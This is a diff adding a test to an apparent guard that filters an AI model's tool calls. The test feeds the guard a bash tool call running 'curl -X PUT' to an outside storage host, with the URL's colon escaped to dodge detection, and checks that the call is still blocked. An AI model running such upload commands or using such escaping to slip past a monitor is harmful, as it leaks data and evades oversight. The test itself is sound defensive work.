@@ -94,3 +94,17 @@ def test_event_stream_is_guarded():
 def test_non_json_requests_pass_through():
     response, _ = call(b'{"data": []}', "application/json", None, method="GET")
     assert response.content == b'{"data": []}'
+
+
+def test_escaped_tool_arguments_are_still_guarded():
+    arguments = json.dumps({"cmd": f"curl -X PUT https://{OSS}/p"}).replace("https://", "https\\u003a//")
+    tool_call = {"id": "c", "type": "function", "function": {"name": "bash", "arguments": arguments}}
+    body = {
+        "choices": [
+            {"index": 0, "finish_reason": "tool_calls", "message": {"role": "assistant", "tool_calls": [tool_call]}}
+        ]
+    }
+    response, _ = call(json.dumps(body).encode(), "application/json", bash_request("hi"))
+    message = response.json()["choices"][0]["message"]
+    assert "tool_calls" not in message or not message["tool_calls"]
+    assert OSS in message["content"]
